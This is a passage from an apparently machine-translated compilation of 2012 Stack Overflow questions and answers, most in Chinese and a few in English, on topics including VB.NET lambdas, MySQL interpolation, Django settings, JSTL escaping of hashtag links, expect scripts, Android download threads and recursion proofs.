    <property name="jpaDialect" ref="jpaDialect" />
</bean> 
```

我们`TestSuite`使用以下注释运行我们的：

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations ={ "/spring-configuration/test-spring.xml" }) 
```

希望这可以帮助！

# vb.net - VB.NET Linq Expression with function(x) 没有被执行？

> ID：12264877
> 
> 赞同：5
> 
> 时间：2012-09-04T13:46:59.363
> 
> 标签：vb.net, linq

为什么按预期工作：

```
list.ForEach(sub(x) x.Name = "New Name") 
```

但这不是：

```
list.ForEach(function(x) x.Name = "New Name") 
```

还有人困惑吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T13:54:57.207

当您使用`Function`关键字时

```
list.ForEach(Function(x) x.Name = "New Name") 
```

您正在创建一个函数，该函数接受一个名为`x`并返回 a的参数`bool`（在这种情况下）。

所以，在这种情况下，`=`不是赋值运算符，而是比较运算符，因此`Name`属性没有改变。（编译器推断该函数`bool`由于比较运算符而返回 a）

相当于

```
list.ForEach(sub(x) Foobar(x))

...

Function Foobar(x as Foo) As Boolean
    Return x.Name = "New Name" 'returns a boolean'
End Function 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-04T20:00:08.610

List(Of T).ForEach 将不返回值的 Action (Sub) 作为参数，而不是返回值的 Func (Function)。

在 VB 中，= 符号是不明确的。它可以用于比较或赋值。作为消除语句歧义的结果，`x.Name = "New Name"`团队使用指示符 Sub 或 Function 来确定这是比较还是赋值。在 的情况下`Sub(x) x.Name = "New Name"`，您正在执行赋值，或者将 x 的 Name 参数的值设置为“新名称”。如果`Function(x) x.Name = New "Name"`您正在进行比较并返回 x 的 Name 参数是否与“新名称”相同。因此，在使用 Sub 和 Function 时必须小心。

# tsql - SSRS 2005 多对多选择

> ID：12264882
> 
> 赞同：0
> 
> 时间：2012-09-04T13:47:16.340
> 
> 标签：tsql, reporting-services

我有客户和程序。一个客户可以在许多程序中，我有用于多对多数据的 CustomerPrograms 表。我当然也有客户表和程序表。在 SSRS 中，客户端希望能够多选程序参数（从 Programs 表加载的查询）。他们还希望在网格中查看以逗号分隔的程序列表。我编写了一个 UDF 来处理网格部分，但我对如何处理多选参数过滤客户感到困惑，这些客户可能没有、一个或多个程序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T15:41:06.580

我实际上想通了，结果比我想象的要容易得多 - 对于那些感兴趣的部分，where 子句现在看起来像这样（@program 是多选参数）：

```
and exists (select custprog_id from customers_programs (nolock)
        where cust_id = customers.cust_id and program_id in (@program)) 
```

# regex - Powershell 中的正则表达式

> ID：12264884
> 
> 赞同：0
> 
> 时间：2012-09-04T13:47:24.577
> 
> 标签：regex, powershell

我正在编写一个解析文本的脚本，文本根本没有结构，这意味着我愿意提取的内容没有特定的结构。该脚本必须使用正则表达式来查找特定文章的数量：

```
$article ="balls","dolls" 
```

正常结构 =

1.  “3个球”
2.  “2个球和6个娃娃”

我可以使用这样的正则表达式检索值`((\d+)."+$article+"|$)`。这仅适用于物品附近的数量值。

但如果价值不好，我最终什么都没有。例如。

1.  3个球和娃娃或
2.  3个红球

所以我想一个很好的方法是找到 $article 然后回溯任何整数值。我制定了这个正则表达式`(?=.*"+$article+")([\d\.]+)`，但我不能让它只寻找左边的第一个匹配。有什么建议么。

谢谢一堆！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-28T20:32:14.360

第 1 步 - 下载[Expresso](http://www.ultrapico.com/Expresso.htm "快递")。这是开发 RegEx 查询的绝佳界面

第 2 步 - 我还没有机会使用此查询，但第 1 步会有所帮助

# php - 在纯 HTML 网站上写博客

> ID：12264885
> 
> 赞同：0
> 
> 时间：2012-09-04T13:47:26.263
> 
> 标签：php, html, css, ftp, blogs

我试过寻找答案，但我可能使用了错误的短语..

我正在尝试为我的女朋友创建一个独立的博客，我是一名网页设计师，但她希望我制作一个非常个性化的网站。因此，我想用 java 或 jquery 脚本以及 CSS 使她的网站脱离 HTML 编码。

我不想使用像 Wordpress、Joomla 或博客这样的东西。有没有办法让她只用 HTML 结构在她的网站上写博客。请记住，她对 HTML 代码一无所知，也没有任何 FTP 软件或倾向。

基本上，她想像任何其他博客一样登录并开始打字，并且她想要自己的域，但我只想使用 HTML ......或者可能有点 PHP。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:53:02.713

我认为您正在寻找的是 Wordpress。

您只能使用 Wordpress 在 HTML 中编写代码。如果您愿意，也可以使用 PHP（使用简码）。如果一个站点应该是纯 html 的完全静态的，那么登录 cpanel 并开始编写您的 html 代码 :) 您可能需要的只是一个合适的模板。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:06:19.150

You'll need to create a Content Management System, or CMS, and pretty much reinvent the wheel that Wordpress, Joomla, and Blogger already are.

You'll need some sort of server side language to accept input (whether it be images, blog posts, etc) to save them on the server, PHP can do this, [but it's still PHP](http://www.codinghorror.com/blog/2012/06/the-php-singularity.html). Javascript cannot do that by itself, neither can HTML or CSS as I'm sure you know.

I highly recommend against rewriting the wheel like this for a few reasons. Primarily security. You could easily make a few mistakes in the log in page, subtle mistakes that don't even seem like mistakes that somebody could abuse to gain entry to the site's content. What good is a gorgeous site if you can't lock it down? The site would quickly lose integrity.

Maintaining a site like this can also be a problem for a single person such as yourself. The simplest CMS is the most rigid, but I imagine she'd want control over rigidity. If you're doing this yourself, this becomes difficult quickly. This will take a lot of time and effort. Time and effort you won't be paid for.

If you do undertake this, she's going to have requests and you will quickly turn into a business relationship when it comes to the site. She'll be your client, always making requests asking you for help when it doesn't do what she expects it to. This is stressful/annoying in work environments, I can't imagine what it'd do to a relationship.

Can this be done using purely HTML/Javascript/CSS? No.

Can this be done with a little PHP? Yes.

Should it? I recommend against it. Find a Wordpress-esque site that gives you the control she wants and go with it. It'll save you a lot of time, effort, and maybe even the relationship, you never know. If you still want to design the look of her site, many of these sites allow for that but still have the powerful, secure, and maintained-by-other-people backend that will make the site that much easier to blog for.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:53:57.327

使用 PHP 和数据库将解决您的问题。输入博客文章，将其保存到数据库（SQL 或 Access），然后在显示博客文章的页面上检索它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T13:51:57.613

一点 PHP 将解决您的问题。在某种密码保护区域中使用 TinyMCE 或 FCKEditor 作为 WYSIWYG（所见即所得）编辑器。然后将编辑器的内容保存在 HTML 文件中（使用 PHP 很容易），并将 HTML 文件包含在博客条目列表中（访问者将看到的页面）。如果您添加 MySQL，您将保存博客的文件写入和排序（按日期），如果您仅使用 HTML 文件，这可能会很棘手。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-04T13:56:53.627

如果你真的想要一些简单的东西，你可以使用[Scriptogr.am](http://www.scriptogr.am)例如。它将您的帖子存储在 Dropbox 中，并使用 MarkDown 语言编写，这是一种比 HTML 更简单的博客方式。

如果您需要一些评论，您可以查看评论平台，例如[Disqus](http://disqus.com/)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-04T14:21:56.137

我会使用一个简单的 Ruby on Rails 应用程序，如此处所述。 [http://guides.rubyonrails.org/getting_started.html](http://guides.rubyonrails.org/getting_started.html) 启动它只需 20 分钟，您可以直接将其部署到 heroku 以获取内容主机。

# eclipse - Eclipse 项目名称验证

> ID：12264887
> 
> 赞同：0
> 
> 时间：2012-09-04T13:47:29.033
> 
> 标签：eclipse, eclipse-rcp

为什么 Eclipse 允许创建名称中包含特殊字符的项目？我可以创建名为 '!#$!#!#@$!@#$' 的项目

即使是 eclipse 的 eclipse 源，也只考虑以下字符对项目名称无效。

```
INVALID_RESOURCE_CHARACTERS = new char[] {'\\', '/', ':', '*', '?', '"', '<', '>', '|'}; 
```

其背后的逻辑是什么？这些字符对日食有什么特殊含义吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T14:01:27.240

默认情况下，项目名称用作项目中所有资源的根文件夹名称。这就是驱动命名限制的原因。

# c# - 如何使用 Open XML 从 Word 文档中的控件中读取数据

> ID：12264888
> 
> 赞同：1
> 
> 时间：2012-09-04T13:47:30.380
> 
> 标签：c#, ms-word, openxml

我正在使用**Open XML SDK 2.0 在 C# 中编写代码。**我在**Word 文档**中定义了一些控件，例如 TextBox、Select Option 等。我想以编程方式读取它们的数据（示例如下）。

```
WordprocessingDocument InputWordDocument = WordprocessingDocument.Open(@"C:\Users\jayant\Desktop\Template.docx", false);
foreach (Control ctrl in InputWordDocument.MainDocumentPart.Document.Body.Descendants<Control>())
{
    Console.WriteLine(ctrl.Name.Value);
} 
```

但它显示控件的名称而不是它们的值。

我如何获得价值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-05T08:59:47.700

您必须使用 DocumentFormat.OpenXml.Wordprocessing.Control 类而不是 System.Windows.Forms.Control 类！更改之后您必须通过子节点。

```
WordprocessingDocument InputWordDocument = WordprocessingDocument.Open(@"C:\Users\jayant\Desktop\Template.docx", false);
foreach (DocumentFormat.OpenXml.Wordprocessing.Control ctrl in InputWordDocument.MainDocumentPart.Document.Body.Descendants<Control>())
{
    ...
} 
```

提示：使用 XmlNode 更容易处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T17:13:33.253

您必须使用 ctrl.Id 来获取关系 id 而不是 ctrl.Name。您需要此关系 ID 才能访问存储在其他地方的控件内容。

之后，您可以调用 MainDocumentPart.GetPartById(ctrl.Id) 并获取控制数据。在使用任何东西之前，请记住您必须将其转换为正确的类型。

# mysql - MySql - 为跳过的数字插入行（插值）

> ID：12264892
> 
> 赞同：3
> 
> 时间：2012-09-04T13:47:37.350
> 
> 标签：mysql

我有一张这样的表（简化）：

```
+------+--------+
| tick | value  |
+------+--------+
|    1 |     10 |
|    2 |     20 |
|    5 |     50 |
|    7 |     10 |
|   10 |     85 |
+------+--------+ 
```

我想生成**另一个**表，其中包含从`min(tick)`到的所有数字`max(tick)`作为刻度值：

```
+------+--------+
| tick | value  |
+------+--------+
|    1 |     10 |           * already exists
|    2 |     20 |           * already exists
|    3 |     30 | = 20 + 10
|    4 |     40 | = 30 + 10
|    5 |     50 | = 40 + 10 * already exists
|    6 |     30 | = 50 - 20
|    7 |     10 | = 30 - 10 * already exists
|    8 |     35 | = 10 + 25
|    9 |     60 | = 35 + 25
|   10 |     85 | = 60 + 25 * already exists
+------+--------+ 
```

要清楚，

1.  我有**不连续的**刻度值并想插入缺失的刻度。
2.  我想对**另一个**表执行此操作，因此不会修改原始表。
3.  `value`缺失s 的 s从前一个现有刻度到下一个现有刻度以**相等的步长**`tick`增加/减少。作为一个伪公式： **`increment = (next_value - current_value) / (next_tick - current_tick)`**

 ****如何管理这个？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T14:41:07.870

此存储过程将执行您想要的操作，填充表`allticks`

```
CREATE PROCEDURE `tickster`()
BEGIN
    DECLARE finished INT DEFAULT 0;
    DECLARE oldticks INT DEFAULT 0; -- initial ticks here
    DECLARE oldvalue INT DEFAULT 0; -- initial value here
    DECLARE newticks INT DEFAULT 0;
    DECLARE newvalue INT DEFAULT 0;
    DECLARE t INT DEFAULT 0;
    DECLARE v INT DEFAULT 0;
    DECLARE delta INT DEFAULT 0;

    DECLARE existing CURSOR FOR SELECT ticks,value FROM ticks ORDER BY ticks;
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET finished=1;

    OPEN existing;

    nexttick: LOOP
        -- Get next value or break
        FETCH existing INTO newticks,newvalue;
        IF finished>0 THEN
            LEAVE nexttick;
        END IF;

        -- initialize a loop to cover the inexistant ticks
        SET t=oldticks+1;
        SET v=oldvalue;
        SET delta=(newvalue-oldvalue)/(newticks-oldticks);

        -- run the loop
        nextstep: LOOP
            IF t>=newticks THEN
                LEAVE nextstep;
            END IF;
            -- calculate new interpolated value and write it to the table
            SET v=v+delta;
            INSERT INTO allticks SET ticks=t, value=v;
            SET t=t+1;
        END LOOP;

        -- write the existing value to the table
        INSERT INTO allticks SET ticks=newticks, value=newvalue;

        -- make new dataset the old dataset
        SET oldticks=newticks;
        SET oldvalue=newvalue;

    END LOOP;
END 
```

在指示处添加初始刻度和值，如果没有刻度 = 1 的行，则需要它们

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:03:40.310

首先你创建一个数字表

```
Create Table ALL_NUMBERS (
   N Integer
)

Alter table ALL_NUMBERS add primary key (n); 
```

然后将数字表从 1 填充到一个大数字，比如 1 百万

然后 Left 将您的数据表与此数字表连接并填补空白..**

# asp.net - 在 ASP.NET 中模拟谷歌图片搜索页面

> ID：12264893
> 
> 赞同：0
> 
> 时间：2012-09-04T13:47:40.240
> 
> 标签：asp.net, dynamic, load

我正在使用 ASP.NET/C# 开发一个在线食品配送网站，我有一个显示餐厅列表的页面：

[http://www.zoodfood.net/Restaurant/newlist.aspx?page=1](http://www.zoodfood.net/Restaurant/newlist.aspx?page=1)

你可以在上面的地址看到这个页面的初始界面，目前每个页面只显示6个餐厅，它有一个查询字符串（page=1）决定从数据库加载的餐厅索引，但我要模拟类似于谷歌图片搜索页面，这样就不需要使用查询字符串，用户也不需要更改页面。我的用户可以轻松滚动页面并动态加载新项目

我应该如何实施这样的技术？有没有样品或提示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:37:37.927

您正在寻找的技术是“无限滚动”，在[http://dotnet.dzone.com/articles/infinite-scrolling-aspnet](http://dotnet.dzone.com/articles/infinite-scrolling-aspnet)和[Microsoft有一个相当不错的教程](http://code.msdn.microsoft.com/VBASPNETInfiniteLoading-10c3f379)

# smalltalk - 是否有 Seaside 偏好来创建更多人类可读的 html，即包含换行符的 html？

> ID：12264897
> 
> 赞同：5
> 
> 时间：2012-09-04T13:47:50.990
> 
> 标签：smalltalk, seaside

Seaside 创建的标准 html 输出都在一行中，没有任何换行符。

是否有偏好更改此行为，以便输出更具人类可读性？

如果没有，有什么方法可以改变这种行为？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T14:02:51.917

afaik，没有这样的偏好。

请注意，网络浏览器中的开发人员工具（例如 firebug 和 webkit 开发工具）可以向您显示格式化的 html 并切换到漂亮打印生成的 javascript。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-08T12:09:22.683

没有这样的偏好，原因是

*   HTML 对空格很敏感（这也取决于样式），
*   [开发人员工具](http://book.seaside.st/book/fundamentals/rendering-components/fun-with-canvas)已经向您展示了漂亮的打印 html，并且
*   FireBug 和 WebKit 开发者工具等工具也可以为您提供帮助。

# python - 根据操作系统自定义 Django settings.py 文件

> ID：12264900
> 
> 赞同：0
> 
> 时间：2012-09-04T13:47:55.513
> 
> 标签：python, django, operating-system, dropbox

我正在使用两台不同的机器，Windows 和 Mac Os X 处理 Django 项目。我通过 Dropbox 同步了所有内容。问题是 settings.py 中的一些设置是单个字符串（例如 MEDIA_ROOT 或 STATIC_ROOT）而不是元组。这意味着我可以为两个操作系统中的一个设置正确的路径，比如说 STATIC_ROOT。在另一个当然它不会工作。

我想知道是否存在一种方法来识别 OS python 正在运行并根据它通过条件选择正确的设置。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T13:49:39.067

settings.py 文件就是 python，所以你可以很容易地根据平台切换语句。使用[`platform`模块](http://docs.python.org/library/platform.html)：

```
import platform

if platform.system() == 'Darwin':
    MEDIA_ROOT = 'something'
else:
    MEDIA_ROOT = 'somethingelse' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:21:32.410

您不应该首先设置绝对路径。使用类似`os.path.dirname(__file__)`获取 settings.py 所在的目录，然后将其与特定路径部分结合起来，例如：

```
STATIC_ROOT = os.path.join(os.path.dirname(__file__), 'static') 
```

然后，您在哪个平台上运行不再重要。FWIW，实际存储基本路径是典型的，因为它经常需要，例如：

```
PROJECT_ROOT = os.path.dirname(__file__)
...
STATIC_ROOT = os.path.join(PROJECT_ROOT, 'static') 
```

# java - Java 允许 XSS 过滤器的异常

> ID：12264902
> 
> 赞同：0
> 
> 时间：2012-09-04T13:47:59.567
> 
> 标签：java, jstl, xss

*我[把这篇文章](https://stackoverflow.com/questions/1159729/java-best-practices-to-prevent-cross-site-scripting)和其他关于在这件事上使用 JSTL 的文章都加红了。*

我的问题有点不同。我们的一项功能允许用户在他们的评论中写标签。

每当列出评论时，服务器脚本就会全部`#fooHastag`变为`<a href='tag?fooHashtag'>#fooHashtag</a>`.

然后使用 JSTL 在 GUI 上侦听所有注释：

```
<c:forEach items="${comments}" var = "comment">
    ${fn:escapeXml(comment)}
</c:forEach 
```

正如预期的那样，这段代码也逃脱了服务器上构建的哈希链接。如果我删除`fn:escapeXml`应用程序将不再安全。

您对解决此问题有任何想法吗？（除了手动构建 xss 过滤器）如果我能够`escapeXml`在转换主题标签之前以某种方式在服务器上使用 JSTL，那就太好了。有没有办法做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T04:51:43.537

解决它的一些方法：

*   在添加标签之前转义。使用像样的 html 编码器而不是 escapeXml（HTML 甚至不是 XML）

*   添加标签，然后运行owasp antisamy。没有逃脱

*   移动标签以将功能链接到 javascript。

# bash - 在期望 {exp_continue} 之后继续脚本

> ID：12264903
> 
> 赞同：1
> 
> 时间：2012-09-04T13:47:59.587
> 
> 标签：bash, scripting, expect

我有如下所示的 bash 代码：

```
/usr/bin/expect -c '
    spawn python Tools/python/install.py
    expect {
        -nocase "password:" {
            send "$env(PASS)\r"
            exp_continue
        }
    }
    interact
' 
```

这段代码似乎可以工作，除了它在提交密码后挂起。在这段代码之后，我想在我的脚本中执行更多代码。有没有办法让我回到 bash 脚本中继续执行这段代码下面的行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T15:49:54.550

*（只是为了正式回答这个问题）......*

我猜这个`interact`命令正在咬你。从手册页：

> **interact**将当前进程的控制权交给用户，这样击键就发送到当前进程，并返回当前进程的stdout和stderr。

我会尝试以下任何一种：

*   删除`interact`命令
*   `&`使用或在后台发出命令`screen`

根据您的评论，看起来前者是有效的。

# java - while 只循环

> ID：12264905
> 
> 赞同：1
> 
> 时间：2012-09-04T13:48:05.560
> 
> 标签：java, sql, loops, while-loop

以前我有一个“do while”循环，现在效果很好。这次我不能让我的“while”循环工作。

```
|-----|-------|------|------|
|._id.|..INFO.|.DONE.|.LAST.|
|..1..|...A...|...N..|......|
|..2..|...B...|...Y..|..L...|<--- cursor.moveToFirst();
|..3..|...C...|...Y..|......|
|..4..|...D...|...Y..|......|
|..5..|...E...|...N..|......|
|..6..|...F...|...N..|......|
|-----|-------|------|------| 
```

我的代码是：

```
cursor = db.rawQuery("SELECT * FROM " +TABLE_NAME+" WHERE "+LAST+" LIKE '%L%'", null);
cursor.moveToFirst();
if (!cursor.getString(cursor.getColumnIndex(_id)).equals(Long.toString(rowcount)))
{
  while(!cursor.isLast())
  {
    cursor.moveToNext();
    Toast.makeText(context, "your message", Toast.LENGTH_LONG).show();
  }
} 
```

从未进入循环，我知道这一点，因为我的吐司没有弹出。我只是想知道为什么。我可以通过使用“for”循环以另一种方式做到这一点，但我只是想知道我在这个 while 循环中做错了什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:57:52.253

该查询将仅获取 LAST 值为“L”的行。将不会提取剩余的行。因此没有达到条件。

# java - 使用 JPA 的 DateTimeOffset（休眠）

> ID：12264907
> 
> 赞同：1
> 
> 时间：2012-09-04T13:48:10.113
> 
> 标签：java, hibernate, jpa, datetimeoffset

我有一个使用 Hibernate 连接到 SQLserver 的 JPA。它可以工作，但每次我使用带有 DateTimeOffset 字段的实体时都会出现异常。

我尝试使用自定义类型并像这样使用它：

```
@Basic(optional = false)
@Column(name = "EffectiveDate")
@org.hibernate.annotations.Type(type="DateTimeOffsetType")
private Serializable effectiveDate; 
```

DateTimeOffsetType 是我在这里制作的自定义类型： [datetimeoffset hibernate mapping](https://stackoverflow.com/questions/4733844/datetimeoffset-hibernate-mapping)

但是，它仍然不起作用。如何使用休眠和 JPA 读取 DateTimeOffset？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-05T15:02:03.340

我最终通过通过 TimeStamp 类型更改生成实体中字段的所有 Serializable 类型来解决它。

# php - PHP 在表格中列出本周的几天，可以通过按钮更改为显示下周或上周

> ID：12264910
> 
> 赞同：0
> 
> 时间：2012-09-04T13:48:12.050
> 
> 标签：php

我正在尝试启动并运行日历。尽管我对 PHP 不是那么好，但我还是设法让每月视图日历启动并运行得非常好。但是，球门柱已有所移动，并且权限类似于每周查看日历。当他们打开时，它将在表格中显示本周的所有天，然后可以选择前进一周并显示下一周或后一周。我为此苦苦挣扎了很多天，当我确信必须有一个简单的解决方案时，我的代码变得复杂而混乱。

我知道这是一个很大的问题，但如果有人能指出我正确的方向或给我一个简单的脚本让我可以继续生活，我将不胜感激

这是我到目前为止所拥有的

```
$week_number = date("W");
$year = date("Y");

if($week_number < 10){
   $week_number = "0".$week_number;
}

for($day=0; $day<=6; $day++)
{
  echo date('d-m-Y', strtotime($year."W".$week_number.$day))." | \n";
}
?> 
```

如果'next_week'按钮并被点击（我没有包括自我发布表单的一部分以保持脚本简单），我设法通过在 $week_number 中添加 1 来启动并运行它，直到年份改变了，因为过去 53 周的数字进行了，我没有添加一种方法来增加或减少 $year 这就是一切都出错的地方

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-26T04:28:09.657

[DateTime](http://au2.php.net/manual/en/class.datetime.php)和[DateInterval](http://au2.php.net/manual/en/class.dateinterval.php)是你的朋友 (PHP 5.3+)

试一试：

```
<?php

$weekModifier = 0;

$date = new DateTime();

if($date->format('N') !== 1) {
    $date->sub(new DateInterval('P'. $date->format('N') . 'D'));
}

$interval = new DateInterval('P'.abs($weekModifier).'W');

if($weekModifier > 0) {
    $date->add($interval);  
} else {
    $date->sub($interval);  
}

for($i = 1; $i <= 7; $i++) {
    echo $date->add(new DateInterval('P1D'))->format('l Y-m-d') . "<br>\n"; 
}

?> 
```

将周设为 0 将使用本周。否则，您可以简单地使用 1, 2, 3, -,1 ,-2, -3 等...

[在行动中看到它。](http://3v4l.org/tCiN1#v530)

# android - 在所有活动中使用服务更新 ProgressBar

> ID：12264924
> 
> 赞同：1
> 
> 时间：2012-09-04T13:48:51.550
> 
> 标签：android, multithreading, service, progress-bar, intentservice

我有一个应用程序，根据要求，正在从后台线程处理中下载图像。根据需要，我想在所有活动上显示水平进度条，同时下载照片。这也是负责我的应用程序的整个 Json 解析的类。为此，我实现了一个扩展 Service 并调用其 onCreate 方法的类。但是我仍然不清楚如何更新当前的进度条，如果用户切换到其他屏幕，进度条也应该相应地更新。以前我尝试使用 IntentService 类，但它需要

```
MyService (String name){
  super(name);
} 
```

但不幸的是，它不适合我的情况，我遇到了 logcat 异常，比如`'cant instantiate the default constructor of IntentService'`

我真的被困在这种情况下。如果有人遇到过这种情况，请给我一些建议/代码片段。

这是我当前的示例代码： http: [//pastebin.com/HCWFPtbb](http://pastebin.com/HCWFPtbb)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:12:20.680

```
public final class DownloadThread extends Thread
    {

        private static final String       TAG           = DownloadThread.class.getSimpleName();

        private Handler                   handler;

        private int                       totalQueued;

        private int                       totalCompleted;

        private final DownloadThreadListener listener;

        private boolean                   isRunning   = false;

        protected boolean                   isStop;

        private TaskInitiator               mtaskInitiator = null;

        /**
         * @return the isRunning
         */
        public boolean isRunning()
            {
                return isRunning;
            }

        public DownloadThread(DownloadThreadListener listener)
            {
                this.listener = listener;
                isStop = false;
            }

        @Override
        public void run()
            {
                try
                    {

                        Looper.prepare();

                        mtaskInitiator = new TaskInitiator();
                        handler = new Handler();
                        isRunning = true;

                        Looper.loop();

                    }
                catch (Throwable t)
                    {
                        Log.e(TAG, "DownloadThread halted due to an error", t);
                    }
            }

        public synchronized void requestStop()
            {

                isStop = true;

            }

        public synchronized void enqueueDownload(DownloadTask task)
            {

                mtaskInitiator = new TaskInitiator();
                mtaskInitiator.setTask(task);
                handler.post(mtaskInitiator);
                totalQueued++;

            }

        public synchronized void removeTasks()
            {

                if (mtaskInitiator != null)
                    {

                        handler.removeCallbacks(mtaskInitiator);
                        totalQueued = 0;
                        totalCompleted = 0;
                    }
            }

        class TaskInitiator implements Runnable
            {

                private DownloadTask task = null;

                public DownloadTask getTask()
                    {
                        return task;
                    }

                public void setTask(DownloadTask task)
                    {
                        this.task = task;
                    }

                public TaskInitiator()
                    {
                        // TODO Auto-generated constructor stub
                    }

                @Override
                public void run()
                    {
                        try
                            {
                                task.run();

                            }
                        finally
                            {

                                if (isStop)
                                    {
                                        Looper.myLooper().quit();
                                    }
                                synchronized (DownloadThread.this)
                                    {
                                        signalUpdate(task.getCurrentBitmap(), task.getCurrentFeedUrl());
                                        task.setCurrentBitmap(null);
                                        totalCompleted++;

                                    }

                            }

                    }

            }

        public synchronized int getTotalQueued()
            {
                return totalQueued;
            }

        public synchronized int getTotalCompleted()
            {
                return totalCompleted;
            }

        public void signalUpdate(Bitmap bmap, String bmapUrl)
            {

                if (listener != null)
                    {
                        listener.handleDownloadThreadUpdate(bmap, bmapUrl);
                    }
            }

    } 
```

并让您的 Activity 组件实现以下接口以从 Thread 类进行回调。

```
public interface DownloadThreadListener {

void handleDownloadThreadUpdate(Bitmap bmap,String bmapUrl);

Map<String, Bitmap> giveImages_Map();

ConcurrentHashMap<String, SoftReference<Bitmap>> giveSoftImages_Map(); 
```

}

# php - 如何使用数据记录集格式化数组

> ID：12264926
> 
> 赞同：0
> 
> 时间：2012-09-04T13:48:54.230
> 
> 标签：php, mysql

我想用数据库中的数据填充一个数组。我需要它具有与数据库中标头不同的标签。

这就是我需要格式化的方式

```
[ { label: "Choice1", value: "value1" }, ... ] 
```

我用过这个，但后来我得到了错误的标签

```
$items = array();
while ($row_Recordset1 = mysql_fetch_assoc($Recordset1)) {
  $items[] = $row_Recordset1;
} 
```

例如。

```
[{"ID":"2","ARTIST":"!!!"},...] 
```

我需要这样才能使用 jquery ui 插件进行自动完成

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:52:46.337

您需要将数据作为`JSON`对象返回...

```
$items = array();
while ($row_Recordset1 = mysql_fetch_assoc($Recordset1)) {
  $items[] = array(
    'label' => $row_Recordset1['ARTIST'],
    'value' => $row_Recordset1['ID']
  );
}

return json_encode($items); 
```

此外，您应该考虑使用[PDO](http://php.net/book.pdo.php)而不是`MySQL_*`函数，因为它们现在已被弃用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:53:12.833

从您的数据库中获取关联数据，将它们放入一个数组并`json_encode`在结果集上使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:53:21.013

您需要[`json_encode`](http://php.net/json_encode)在关联数组上使用该方法。

# activemq - 如何从 RSS Feed 中删除消息

> ID：12264930
> 
> 赞同：1
> 
> 时间：2012-09-04T13:49:07.437
> 
> 标签：activemq

我们正在使用 ActiveMQ 将消息放置到 rss 提要中。因此，经过一段时间或一些计数后，我想从 rss 提要中删除旧消息。我该怎么做。是否可能。

# algorithm - 递归函数分析中的递归调用次数

> ID：12264936
> 
> 赞同：1
> 
> 时间：2012-09-04T13:49:36.480
> 
> 标签：algorithm, recursion

使用 C++ 中的 Robert Sedwick 书籍自行阅读算法

> 一个递归函数，它将大小为 N 的问题分成两个独立的（非空）部分，它递归地解决这些部分，调用自身的次数少于 N 次。
> 
> 如果这些部分是大小为 k 的部分之一和大小为 Nk 的部分，那么我们使用的递归调用的总数是 T(n) = T(k) + T(nk) + 1，对于 N>=1 和 T( 1) = 0。
> 
> 解 T(N) = N-1 是直接归纳法。如果大小总和小于 N，则调用次数小于 N-1 的证明来自相同的归纳论证。

我对上述文字的问题是

1.  作者如何通过归纳得出解决方案 T(N) = N-1？请帮我理解。
2.  作者的意思是“如果大小总和小于 N，则调用次数小于 N-1 的证明来自相同的归纳论证”？

我是数学归纳法的新手，所以很难理解。

感谢您的时间和帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:54:21.490

(1) 通过归纳：

```
T(1) = 0 (base)
T(N) = T(k) + T(N-k) + 1 (definition of problem) 
```

我们假设对于每个`n < N`，我们得到`T(n) = n-1`
因为两者`k`和`N-k`都更小`N`，所以我们从归纳假设中得到：

```
T(N) = (k-1) + (N-k-1) + 1 = N-1
         ^        ^
        T(k)    T(N-k) 
```

(2) 使用相同的论点：如果

```
T(N) = T(k) + T(m) + 1 where k+m < N 
```

那么同样的证明将导致`T(N) < N-1`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:02:18.960

对于您问题的第一部分，首先我应该提到我认为作者是错误的，因为您有这个递归方程：

T(n) = T(k) + T(nk) + 2 ：因为对于 n > 1，您称两个较小的部分不是一个。现在我们的假设是 2(n-1) 次递归调用。

现在让我们用归纳法检查它：

```
T(1) -> no recursive call.
T(2) = T(1) + T(1) + 2 : two recursive call.
...
T(n) = T(k) + T(n-k) + 2 = 2(k-1) + 2(n-k-1) + 2 = 2n-2 = 2(n-1). 
```

同样对于你问题的第二部分，作者的意思是如果你分成两部分，使得部分的总和小于 n，就像大小为 k 的部分和另一部分大小为 n-2k 的 k > 1。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T14:15:21.993

首先，我们不是“通过归纳得出解”，我们用归纳来证明我们最初的猜测。现在，为了猜测，我们可以使用递归树之类的方法。
在您的问题中，最坏的情况是 for `k=1`，因为它会导致最多的递归。我们还知道每个级别的成本：

```
T(n) = T(1) + T(n-1) + 1 => T(n) = T(n-1) + 1 
```

